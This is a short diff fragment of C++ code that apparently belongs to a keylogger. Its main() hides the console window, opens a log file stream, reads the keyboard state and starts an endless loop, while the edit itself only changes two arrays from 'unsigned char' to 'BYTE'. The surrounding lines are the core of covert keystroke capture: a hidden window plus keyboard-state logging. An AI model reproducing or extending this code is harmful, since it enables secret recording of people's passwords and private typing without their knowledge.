@@ -7,9 +7,9 @@ int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     std::ofstream log;
-    unsigned char state[256];
+    BYTE state[256];
     GetKeyboardState(state);
-    unsigned char tmpState[256];
+    BYTE tmpState[256];
     std::string tmp; 
     while (true)
     {
